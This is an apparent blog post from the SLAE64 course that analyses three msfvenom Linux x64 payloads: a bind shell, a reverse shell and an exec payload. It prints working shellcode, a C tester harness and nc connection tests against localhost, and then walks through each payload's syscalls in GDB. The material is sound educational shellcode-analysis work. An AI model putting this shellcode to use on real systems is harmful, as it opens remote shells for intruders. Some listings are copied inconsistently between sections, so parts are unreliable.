<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>SLAE64 Assignment 5 - Msfvenom Shellcode Analysis  | nibbles</title>
<meta name="keywords" content="slae64">
<meta name="description" content="This post introduces my 5th mission to my SLAE64 journey.
Introduction The SLAE64 5th assignment purpose is to select 3 msfvenom payloads dissect them with gdb and document my own analysis of them.
For this task I selected the following payloads:
linux/x86/shell_bind_tcp linux/x86/shell_reverse_tcp linux/x86/chmod Shellcode 1 - linux/x64/shell_bind_tcp The first step to do is generate the shellcode using MSF. As usual, let&rsquo;s check its arguments
msfvenom -p linux/x64/shell_bind_tcp --list-options">
<meta name="author" content="nibbles">
<link rel="canonical" href="https://0xnibbles.github.io/posts/slae64/slae_64_assignment_5/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.bccfefac377bc340f06c260aed1bddf49a4354816d7c570d6aac75a997986c95.css" integrity="sha256-vM/vrDd7w0DwbCYK7Rvd9JpDVIFtfFcNaqx1qZeYbJU=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://0xnibbles.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://0xnibbles.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://0xnibbles.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://0xnibbles.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://0xnibbles.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="SLAE64 Assignment 5 - Msfvenom Shellcode Analysis " />
<meta property="og:description" content="This post introduces my 5th mission to my SLAE64 journey.
Introduction The SLAE64 5th assignment purpose is to select 3 msfvenom payloads dissect them with gdb and document my own analysis of them.
For this task I selected the following payloads:
linux/x86/shell_bind_tcp linux/x86/shell_reverse_tcp linux/x86/chmod Shellcode 1 - linux/x64/shell_bind_tcp The first step to do is generate the shellcode using MSF. As usual, let&rsquo;s check its arguments
msfvenom -p linux/x64/shell_bind_tcp --list-options" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://0xnibbles.github.io/posts/slae64/slae_64_assignment_5/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-01-01T17:58:44+00:00" />
<meta property="article:modified_time" content="2023-01-01T17:58:44+00:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="SLAE64 Assignment 5 - Msfvenom Shellcode Analysis "/>
<meta name="twitter:description" content="This post introduces my 5th mission to my SLAE64 journey.
Introduction The SLAE64 5th assignment purpose is to select 3 msfvenom payloads dissect them with gdb and document my own analysis of them.
For this task I selected the following payloads:
linux/x86/shell_bind_tcp linux/x86/shell_reverse_tcp linux/x86/chmod Shellcode 1 - linux/x64/shell_bind_tcp The first step to do is generate the shellcode using MSF. As usual, let&rsquo;s check its arguments
msfvenom -p linux/x64/shell_bind_tcp --list-options"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://0xnibbles.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "SLAE64 Assignment 5 - Msfvenom Shellcode Analysis ",
      "item": "https://0xnibbles.github.io/posts/slae64/slae_64_assignment_5/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "SLAE64 Assignment 5 - Msfvenom Shellcode Analysis ",
  "name": "SLAE64 Assignment 5 - Msfvenom Shellcode Analysis ",
  "description": "This post introduces my 5th mission to my SLAE64 journey.\nIntroduction The SLAE64 5th assignment purpose is to select 3 msfvenom payloads dissect them with gdb and document my own analysis of them.\nFor this task I selected the following payloads:\nlinux/x86/shell_bind_tcp linux/x86/shell_reverse_tcp linux/x86/chmod Shellcode 1 - linux/x64/shell_bind_tcp The first step to do is generate the shellcode using MSF. As usual, let\u0026rsquo;s check its arguments\nmsfvenom -p linux/x64/shell_bind_tcp --list-options",
  "keywords": [
    "slae64"
  ],
  "articleBody": " This post introduces my 5th mission to my SLAE64 journey.\nIntroduction The SLAE64 5th assignment purpose is to select 3 msfvenom payloads dissect them with gdb and document my own analysis of them.\nFor this task I selected the following payloads:\nlinux/x86/shell_bind_tcp linux/x86/shell_reverse_tcp linux/x86/chmod Shellcode 1 - linux/x64/shell_bind_tcp The first step to do is generate the shellcode using MSF. As usual, let’s check its arguments\nmsfvenom -p linux/x64/shell_bind_tcp --list-options\n-[~]$ msfvenom -p linux/x64/shell_bind_tcp --list-options Options for payload/linux/x64/shell_bind_tcp: ========================= Name: Linux Command Shell, Bind TCP Inline Module: payload/linux/x64/shell_bind_tcp Platform: Linux Arch: x64 Needs Admin: No Total size: 86 Rank: Normal Provided by: ricky Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- LPORT 4444 yes The listen port RHOST no The target address Description: Listen for a connection and spawn a command shell Let’s get our bind shell using msfvenom. The command below will by default point to 127.0.0.1 and port 4444.\n[~]$ msfvenom -p linux/x64/shell_bind_tcp -f c [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 86 bytes Final size of c file: 389 bytes unsigned char buf[] = \"\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\\x97\" \"\\x52\\xc7\\x04\\x24\\x02\\x00\\x11\\x5c\\x48\\x89\\xe6\\x6a\\x10\\x5a\" \"\\x6a\\x31\\x58\\x0f\\x05\\x6a\\x32\\x58\\x0f\\x05\\x48\\x31\\xf6\\x6a\" \"\\x2b\\x58\\x0f\\x05\\x48\\x97\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x21\" \"\\x58\\x0f\\x05\\x75\\xf6\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\" \"\\x6e\\x2f\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\" \"\\x0f\\x05\"; Compile and Testing the Shellcode Adding the shellcode to our tester program - shellcode.c\n#include #include unsigned char code[] = \"\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\\x97\" \"\\x52\\xc7\\x04\\x24\\x02\\x00\\x11\\x5c\\x48\\x89\\xe6\\x6a\\x10\\x5a\" \"\\x6a\\x31\\x58\\x0f\\x05\\x6a\\x32\\x58\\x0f\\x05\\x48\\x31\\xf6\\x6a\" \"\\x2b\\x58\\x0f\\x05\\x48\\x97\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x21\" \"\\x58\\x0f\\x05\\x75\\xf6\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\" \"\\x6e\\x2f\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\" \"\\x0f\\x05\"; int main() { int (*ret)() = (int(*)())code; ret(); } Compiling with gcc and executing it.\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/5-MSF-Shellcode-Analysis/shell_bind-tcp ‹main●› ╰─$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c ╭─edu@debian ~/Desktop/slae_x86_64/assignments/5-MSF-Shellcode-Analysis/shell_bind-tcp ‹main●› ╰─$ ./shellcode ---------------- ╭─edu@debian ~/Desktop/slae_x86_64/assignments/1-shell-bind-tcp-password-shellcode ‹main●› ╰─$ nc -nv 127.0.0.1 4444 (UNKNOWN) [127.0.0.1] 4444 (?) open id uid=1000(edu) gid=1000(edu) GDB Analysis For this analysis I used GEF plugin to assist my analysis with GDB.\ngdb -q ./shellcode First, we put a breakpoint in code[] to pause the execution at the beggining of the shellcode.\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/5-MSF-Shellcode-Analysis/shell_bind-tcp ‹main●› ╰─$ gdb -q ./shellcode GEF for linux ready, type `gef' to start, `gef config' to configure 77 commands loaded for GDB 8.2.1 using Python engine 3.7 gef➤ b *\u0026code Breakpoint 1 at 0x4040 gef➤ r We go direct to the shellcode’s first instruction.\nDisassembling Bind TCP Shellcode With the isntruction disas we can disassemble the code function. In our context is the Bind Shellcode.\ngef➤ disas Dump of assembler code for function code: =\u003e 0x0000555555558040 \u003c+0\u003e: push 0x29 0x0000555555558042 \u003c+2\u003e: pop rax 0x0000555555558043 \u003c+3\u003e: cdq 0x0000555555558044 \u003c+4\u003e: push 0x2 0x0000555555558046 \u003c+6\u003e: pop rdi 0x0000555555558047 \u003c+7\u003e: push 0x1 0x0000555555558049 \u003c+9\u003e: pop rsi 0x000055555555804a \u003c+10\u003e: syscall 0x000055555555804c \u003c+12\u003e: xchg rdi,rax 0x000055555555804e \u003c+14\u003e: push rdx 0x000055555555804f \u003c+15\u003e: mov DWORD PTR [rsp],0x5c110002 0x0000555555558056 \u003c+22\u003e: mov rsi,rsp 0x0000555555558059 \u003c+25\u003e: push 0x10 0x000055555555805b \u003c+27\u003e: pop rdx 0x000055555555805c \u003c+28\u003e: push 0x31 0x000055555555805e \u003c+30\u003e: pop rax 0x000055555555805f \u003c+31\u003e: syscall 0x0000555555558061 \u003c+33\u003e: push 0x32 0x0000555555558063 \u003c+35\u003e: pop rax 0x0000555555558064 \u003c+36\u003e: syscall 0x0000555555558066 \u003c+38\u003e: xor rsi,rsi 0x0000555555558069 \u003c+41\u003e: push 0x2b 0x000055555555806b \u003c+43\u003e: pop rax 0x000055555555806c \u003c+44\u003e: syscall 0x000055555555806e \u003c+46\u003e: xchg rdi,rax 0x0000555555558070 \u003c+48\u003e: push 0x3 0x0000555555558072 \u003c+50\u003e: pop rsi 0x0000555555558073 \u003c+51\u003e: dec rsi 0x0000555555558076 \u003c+54\u003e: push 0x21 0x0000555555558078 \u003c+56\u003e: pop rax 0x0000555555558079 \u003c+57\u003e: syscall 0x000055555555807b \u003c+59\u003e: jne 0x555555558073 0x000055555555807d \u003c+61\u003e: push 0x3b 0x000055555555807f \u003c+63\u003e: pop rax 0x0000555555558080 \u003c+64\u003e: cdq 0x0000555555558081 \u003c+65\u003e: movabs rbx,0x68732f6e69622f 0x000055555555808b \u003c+75\u003e: push rbx 0x000055555555808c \u003c+76\u003e: mov rdi,rsp 0x000055555555808f \u003c+79\u003e: push rdx 0x0000555555558090 \u003c+80\u003e: push rdi 0x0000555555558091 \u003c+81\u003e: mov rsi,rsp 0x0000555555558094 \u003c+84\u003e: syscall End of assembler dump. Socket Syscall 0x0000555555558040 \u003c+0\u003e: push 0x29 0x0000555555558042 \u003c+2\u003e: pop rax 0x0000555555558043 \u003c+3\u003e: cdq 0x0000555555558044 \u003c+4\u003e: push 0x2 0x0000555555558046 \u003c+6\u003e: pop rdi 0x0000555555558047 \u003c+7\u003e: push 0x1 0x0000555555558049 \u003c+9\u003e: pop rsi 0x000055555555804a \u003c+10\u003e: syscall rax is set to 0x29 which is the socket syscall number.\ncdq is for clearing rdx.\nrdi is set to 0x2 which is AF_INET.\nrsi is set to 0x1 which is SOCK_STREAM\nBind Syscall 0x000055555555804c \u003c+12\u003e: xchg rdi,rax ; stores socket file descriptor in rdi 0x000055555555804e \u003c+14\u003e: push rdx ; rdx is null 0x000055555555804f \u003c+15\u003e: mov DWORD PTR [rsp],0x5c110002 0x0000555555558056 \u003c+22\u003e: mov rsi,rsp 0x0000555555558059 \u003c+25\u003e: push 0x10 0x000055555555805b \u003c+27\u003e: pop rdx 0x000055555555805c \u003c+28\u003e: push 0x31 0x000055555555805e \u003c+30\u003e: pop rax 0x000055555555805f \u003c+31\u003e: syscall ``push rdxwill push 4 bytes of zeros regardingIPADDR_ANY`. This means it will bind in all interfaces.\n0x5c110002\n0002 is AF_INET 5c11 if for PORT 4444 in Little-Endian format Then puts 0x10 (16 bytes) in rdx which is the struct size\n0x31 is bind syscall number. Listen Syscall 0x0000555555558061 \u003c+33\u003e: push 0x32 0x0000555555558063 \u003c+35\u003e: pop rax 0x0000555555558064 \u003c+36\u003e: syscall\nPuts 0x32 in rax, listen syscall number\nListen has a 2nd argument called backlog holed in rsi which defines the maximum length to which the queue of pending connections for sockfd may grow. This does not has a real importance for our exercise.\nAccept Syscall 0x0000555555558066 \u003c+38\u003e: xor rsi,rsi 0x0000555555558069 \u003c+41\u003e: push 0x2b 0x000055555555806b \u003c+43\u003e: pop rax 0x000055555555806c \u003c+44\u003e: syscall Clear rsi and put accpet ssycall number in rax. As there is no struct needed for the socket address, rsi and rdx are set to zero.\nDup2 Syscall Loop 0x0000555555558070 \u003c+48\u003e: push 0x3 0x0000555555558072 \u003c+50\u003e: pop rsi 0x0000555555558073 \u003c+51\u003e: dec rsi 0x0000555555558076 \u003c+54\u003e: push 0x21 0x0000555555558078 \u003c+56\u003e: pop rax 0x0000555555558079 \u003c+57\u003e: syscall 0x000055555555807b \u003c+59\u003e: jne 0x555555558073 The already “famous” dup2 syscall loop for stdin, stdout and stderr.\nPuts 0x21, the dup2 syscall number in rax\nExecve Syscall The syscall used to call /bin/sh and spawn a shell to an incoming connection.\n0x000055555555807d \u003c+61\u003e: push 0x3b 0x000055555555807f \u003c+63\u003e: pop rax 0x0000555555558080 \u003c+64\u003e: cdq set rax with execve syscall cdq clears rdx 0x0000555555558081 \u003c+65\u003e: movabs rbx,0x68732f6e69622f ; /bin/sh 0x000055555555808b \u003c+75\u003e: push rbx ; push null 0x000055555555808c \u003c+76\u003e: mov rdi,rsp rdi is set to the memory address of the null-terminated string /bin/sh 0x000055555555808f \u003c+79\u003e: push rdx ; push null 0x0000555555558090 \u003c+80\u003e: push rdi ; push memory of /bin/sh 0x0000555555558091 \u003c+81\u003e: mov rsi,rsp 0x0000555555558094 \u003c+84\u003e: syscall rsi is set to a pointer of a pointer address of /bin/sh Calls execve with the syscall isntruction Shellcode 2 - linux/x64/shell_reverse_tcp The first step to do is generate the shellcode using MSF. As usual, let’s check its arguments\nmsfvenom -p linux/x64/shell_reverse_tcp --list-options\n-[~]$ msfvenom -p linux/x64/shell_reverse_tcp --list-options Options for payload/linux/x64/shell_reverse_tcp: ========================= Name: Linux Command Shell, Reverse TCP Inline Module: payload/linux/x64/shell_reverse_tcp Platform: Linux Arch: x64 Needs Admin: No Total size: 74 Rank: Normal Provided by: ricky Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Let’s get our bind shell using msfvenom. The command below will by default point to 127.0.0.1 and port 4444.\n[~]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST='127.1.1.1' -f c [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 74 bytes unsigned char shellcode[] = \"\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\\x97\\x48\" \"\\xb9\\x02\\x00\\x11\\x5c\\x7f\\x01\\x01\\x01\\x51\\x48\\x89\\xe6\\x6a\\x10\" \"\\x5a\\x6a\\x2a\\x58\\x0f\\x05\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x21\\x58\" \"\\x0f\\x05\\x75\\xf6\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\" \"\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05\"; Compile and Testing the Shellcode Adding the shellcode to our tester program - shellcode.c\n#include #include unsigned char code[] = \\ \"\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\\x97\" \"\\x52\\xc7\\x04\\x24\\x02\\x00\\x11\\x5c\\x48\\x89\\xe6\\x6a\\x10\\x5a\" \"\\x6a\\x31\\x58\\x0f\\x05\\x6a\\x32\\x58\\x0f\\x05\\x48\\x31\\xf6\\x6a\" \"\\x2b\\x58\\x0f\\x05\\x48\\x97\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x21\" \"\\x58\\x0f\\x05\\x75\\xf6\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\" \"\\x6e\\x2f\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\" \"\\x0f\\x05\"; main() { printf(\"Shellcode Length: %d\\n\", strlen(code)); int (*ret)() = (int(*)())code; ret(); } Compiling with gcc and executing it.\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/5-MSF-Shellcode-Analysis/shell_reverse-tcp ‹main●› ╰─$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c shellcode.c:12:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ ╭─edu@debian ~/Desktop/slae_x86_64/assignments/5-MSF-Shellcode-Analysis/shell_reverse-tcp ‹main●› ╰─$ ./shellcode Shellcode Length: 17 ---------------- ╭─edu@debian ~/Desktop/slae_x86_64/assignments/1-shell-bind-tcp-password-shellcode ‹main●› ╰─$ nc -lvnp 4444 1 ↵ listening on [any] 4444 ... connect to [127.1.1.1] from (UNKNOWN) [127.0.0.1] 44176 whoami edu GDB Analysis For this analysis I used GEF plugin to assist my analysis with GDB.\ngdb -q ./shellcode First, we put a breakpoint in code[] to pause the execution at the beggining of the shellcode.\n─edu@debian ~/Desktop/slae_x86_64/assignments/5-MSF-Shellcode-Analysis/shell_reverse-tcp ‹main●› ╰─$ gdb -q shellcode GEF for linux ready, type `gef' to start, `gef config' to configure 77 commands loaded for GDB 8.2.1 using Python engine 3.7 gef➤ b *\u0026code Breakpoint 1 at 0x4060 gef➤ r We go direct to the shellcode’s first instruction.\nDisassembling Reverse TCP Shellcode With the instruction disas we can disassemble the code function. In our context is the Bind Shellcode.\ngef➤ disas Dump of assembler code for function code: =\u003e 0x0000555555558060 \u003c+0\u003e: push 0x29 0x0000555555558062 \u003c+2\u003e: pop rax 0x0000555555558063 \u003c+3\u003e: cdq 0x0000555555558064 \u003c+4\u003e: push 0x2 0x0000555555558066 \u003c+6\u003e: pop rdi 0x0000555555558067 \u003c+7\u003e: push 0x1 0x0000555555558069 \u003c+9\u003e: pop rsi 0x000055555555806a \u003c+10\u003e: syscall 0x000055555555806c \u003c+12\u003e: xchg rdi,rax 0x000055555555806e \u003c+14\u003e: movabs rcx,0x101017f5c110002 0x0000555555558078 \u003c+24\u003e: push rcx 0x0000555555558079 \u003c+25\u003e: mov rsi,rsp 0x000055555555807c \u003c+28\u003e: push 0x10 0x000055555555807e \u003c+30\u003e: pop rdx 0x000055555555807f \u003c+31\u003e: push 0x2a 0x0000555555558081 \u003c+33\u003e: pop rax 0x0000555555558082 \u003c+34\u003e: syscall 0x0000555555558084 \u003c+36\u003e: push 0x3 0x0000555555558086 \u003c+38\u003e: pop rsi 0x0000555555558087 \u003c+39\u003e: dec rsi 0x000055555555808a \u003c+42\u003e: push 0x21 0x000055555555808c \u003c+44\u003e: pop rax 0x000055555555808d \u003c+45\u003e: syscall 0x000055555555808f \u003c+47\u003e: jne 0x555555558087 0x0000555555558091 \u003c+49\u003e: push 0x3b 0x0000555555558093 \u003c+51\u003e: pop rax 0x0000555555558094 \u003c+52\u003e: cdq 0x0000555555558095 \u003c+53\u003e: movabs rbx,0x68732f6e69622f 0x000055555555809f \u003c+63\u003e: push rbx 0x00005555555580a0 \u003c+64\u003e: mov rdi,rsp 0x00005555555580a3 \u003c+67\u003e: push rdx 0x00005555555580a4 \u003c+68\u003e: push rdi 0x00005555555580a5 \u003c+69\u003e: mov rsi,rsp 0x00005555555580a8 \u003c+72\u003e: syscall 0x00005555555580aa \u003c+74\u003e: add BYTE PTR [rax],al End of assembler dump. Socket Syscall 0x0000555555558040 \u003c+0\u003e: push 0x29 0x0000555555558042 \u003c+2\u003e: pop rax 0x0000555555558043 \u003c+3\u003e: cdq 0x0000555555558044 \u003c+4\u003e: push 0x2 0x0000555555558046 \u003c+6\u003e: pop rdi 0x0000555555558047 \u003c+7\u003e: push 0x1 0x0000555555558049 \u003c+9\u003e: pop rsi 0x000055555555804a \u003c+10\u003e: syscall rax is set to 0x29 which is the socket syscall number.\ncdq sets rdx to null.\nrdi is set to 0x2 which is AF_INET.\nrsi is set to 0x1 which is SOCK_STREAM\nConnect Syscall Below the struct for the socket address.\n0x000055555555804c \u003c+12\u003e: xchg rdi,rax ; stores socket file descriptor in rdi 0x000055555555806e \u003c+14\u003e: movabs rcx,0x101017f5c110002 0x0000555555558078 \u003c+24\u003e: push rcx 0x0000555555558079 \u003c+25\u003e: mov rsi,rsp 0x000055555555807c \u003c+28\u003e: push 0x10 0x000055555555807e \u003c+30\u003e: pop rdx 0x000055555555807f \u003c+31\u003e: push 0x2a 0x0000555555558081 \u003c+33\u003e: pop rax 0x0000555555558082 \u003c+34\u003e: syscall Puts 0x101017f5c110002 in rcx and passes the struct pointer to rsi 0002 is AF_INET 5c11 if for PORT 4444 in Little-Endian format 101017f if the IP address 127.0.0.1 Then puts 0x10 (16 bytes) in rdx which is the struct size\n0x2a is connect syscall number. Dup2 Syscall Loop 0x0000555555558070 \u003c+48\u003e: push 0x3 0x0000555555558072 \u003c+50\u003e: pop rsi 0x0000555555558073 \u003c+51\u003e: dec rsi 0x0000555555558076 \u003c+54\u003e: push 0x21 0x0000555555558078 \u003c+56\u003e: pop rax 0x0000555555558079 \u003c+57\u003e: syscall 0x000055555555807b \u003c+59\u003e: jne 0x555555558073 The already “famous” dup2 syscall loop for stdin, stdout and stderr.\nPuts 0x21, the dup2 syscall number in rax\nExecve Syscall The syscall used to call /bin/sh and spawn a shell to an incoming connection.\n0x000055555555807d \u003c+61\u003e: push 0x3b 0x000055555555807f \u003c+63\u003e: pop rax 0x0000555555558080 \u003c+64\u003e: cdq set rax with execve syscall cdq clears rdx 0x0000555555558081 \u003c+65\u003e: movabs rbx,0x68732f6e69622f ; /bin/sh 0x000055555555808b \u003c+75\u003e: push rbx ; push null 0x000055555555808c \u003c+76\u003e: mov rdi,rsp rdi is set to the memory address of the null-terminated string /bin/sh 0x000055555555808f \u003c+79\u003e: push rdx ; push null 0x0000555555558090 \u003c+80\u003e: push rdi ; push memory of /bin/sh 0x0000555555558091 \u003c+81\u003e: mov rsi,rsp 0x0000555555558094 \u003c+84\u003e: syscall rsi is set to a pointer of a pointer address of /bin/sh Calls execve with the syscall instruction Shellcode 3 - linux/x64/exec The first step to do is generate the shellcode using MSF. As usual, let’s check its arguments\nmsfvenom -p linux/x64/exec --list-options\n-[~]$ msfvenom -p linux/x64/shell_reverse_tcp --list-options Options for payload/linux/x64/shell_reverse_tcp: ========================= Name: Linux Command Shell, Reverse TCP Inline Module: payload/linux/x64/shell_reverse_tcp Platform: Linux Arch: x64 Needs Admin: No Total size: 74 Rank: Normal Provided by: ricky Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Description: Connect back to attacker and spawn a command shell Let’s get our bind shell using msfvenom. The command below will by default point to 127.0.0.1 and port 4444.\n[~]$ msfvenom -p linux/x64/exec CMD=whoami -f c [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 43 bytes Final size of c file: 208 bytes unsigned char buf[] = \"\\x48\\xb8\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x99\\x50\\x54\\x5f\" \"\\x52\\x66\\x68\\x2d\\x63\\x54\\x5e\\x52\\xe8\\x07\\x00\\x00\\x00\\x77\" \"\\x68\\x6f\\x61\\x6d\\x69\\x00\\x56\\x57\\x54\\x5e\\x6a\\x3b\\x58\\x0f\" \"\\x05\"; Compile and Testing the Shellcode Adding the shellcode to our tester program - shellcode.c\n#include #include unsigned char code[] = \\ \"\\x48\\xb8\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x99\\x50\\x54\\x5f\" \"\\x52\\x66\\x68\\x2d\\x63\\x54\\x5e\\x52\\xe8\\x07\\x00\\x00\\x00\\x77\" \"\\x68\\x6f\\x61\\x6d\\x69\\x00\\x56\\x57\\x54\\x5e\\x6a\\x3b\\x58\\x0f\" \"\\x05\"; main() { printf(\"Shellcode Length: %d\\n\", strlen(code)); int (*ret)() = (int(*)())code; ret(); } Compiling with gcc and executing it.\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/5-MSF-Shellcode-Analysis/exec ‹main●› ╰─$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c 130 ↵ shellcode.c:11:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ ╭─edu@debian ~/Desktop/slae_x86_64/assignments/5-MSF-Shellcode-Analysis/exec ‹main●› ╰─$ ./shellcode Shellcode Length: 9 edu GDB Analysis For this analysis I used GEF plugin to assist my analysis with GDB.\ngdb -q ./shellcode First, we put a breakpoint in code[] to pause the execution at the beggining of the shellcode.\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/5-MSF-Shellcode-Analysis/exec ‹main●› ╰─$ gdb -q shellcode GEF for linux ready, type `gef' to start, `gef config' to configure 77 commands loaded for GDB 8.2.1 using Python engine 3.7 gef➤ b *\u0026code Breakpoint 1 at 0x4060 gef➤ r We go direct to the shellcode’s first instruction.\nDisassembling Reverse TCP Shellcode With the instruction disas we can disassemble the code function. In our context is the exec Shellcode.\nDisassembling Reverse TCP Shellcode gef➤ disas Dump of assembler code for function code: =\u003e 0x0000555555558060 \u003c+0\u003e: movabs rax,0x68732f6e69622f 0x000055555555806a \u003c+10\u003e: cdq 0x000055555555806b \u003c+11\u003e: push rax 0x000055555555806c \u003c+12\u003e: push rsp 0x000055555555806d \u003c+13\u003e: pop rdi 0x000055555555806e \u003c+14\u003e: push rdx 0x000055555555806f \u003c+15\u003e: pushw 0x632d 0x0000555555558073 \u003c+19\u003e: push rsp 0x0000555555558074 \u003c+20\u003e: pop rsi 0x0000555555558075 \u003c+21\u003e: push rdx 0x0000555555558076 \u003c+22\u003e: call 0x555555558082 0x000055555555807b \u003c+27\u003e: ja 0x5555555580e5 0x000055555555807d \u003c+29\u003e: outs dx,DWORD PTR ds:[rsi] 0x000055555555807e \u003c+30\u003e: (bad) 0x000055555555807f \u003c+31\u003e: ins DWORD PTR es:[rdi],dx 0x0000555555558080 \u003c+32\u003e: imul eax,DWORD PTR [rax],0x5e545756 0x0000555555558086 \u003c+38\u003e: push 0x3b 0x0000555555558088 \u003c+40\u003e: pop rax 0x0000555555558089 \u003c+41\u003e: syscall 0x000055555555808b \u003c+43\u003e: add BYTE PTR [rax],al End of assembler dump. /bin/sh? Push, push and push to the stack! 0x0000555555558060 \u003c+0\u003e: movabs rax,0x68732f6e69622f ; /bin/sh 0x000055555555806a \u003c+10\u003e: cdq 0x000055555555806b \u003c+11\u003e: push rax 0x000055555555806c \u003c+12\u003e: push rsp 0x000055555555806d \u003c+13\u003e: pop rdi /bin/sh moved to rax and pushed to the stack. cdq zeroes rdx. pushed a pointer of a pointer to /binsh with push rsp and poped to rdi. It holds a pointer to the command to be executed. Command Flag (-c) 0x000055555555806e \u003c+14\u003e: push rdx 0x000055555555806f \u003c+15\u003e: pushw 0x632d ; -c 0x0000555555558073 \u003c+19\u003e: push rsp 0x0000555555558074 \u003c+20\u003e: pop rsi push rdx null terminates -c string. rdi points to -c Obfudcated “Call-Push-Pop” Syscall? Calling execve in a different way 0x0000555555558076 \u003c+22\u003e: call 0x555555558082 0x000055555555807b \u003c+27\u003e: ja 0x5555555580e5 [...] 0x0000555555558080 \u003c+32\u003e: imul eax,DWORD PTR [rax],0x5e545756 ; redirected to the \"middle\" 0x555555558086 : push 0x3b 0x555555558088 : pop rax 0x555555558089 : syscall Here we have a deja vú of the SLAE32 MSF Shellcode Analysis assignment.\nThe call is used to store the next instruction address onto the stack and redirect execution further in the “middle” of 0x0000555555558080 \u003c+32\u003e: imul eax,DWORD PTR [rax],0x5e545756 instruction\ngef➤ x/7i 0x555555558082 0x555555558082 : push rsi 0x555555558083 : push rdi 0x555555558084 : push rsp 0x555555558085 : pop rsi 0x555555558086 : push 0x3b 0x555555558088 : pop rax 0x555555558089 : syscall Based on the call address, I examined the isntruction after that address and the above obfuscated appeared “magically”.\nThe execve’s Command 0x0000555555558076 \u003c+22\u003e: call 0x555555558082 0x000055555555807b \u003c+27\u003e: ja 0x5555555580e5 0x000055555555807d \u003c+29\u003e: outs dx,DWORD PTR ds:[rsi] 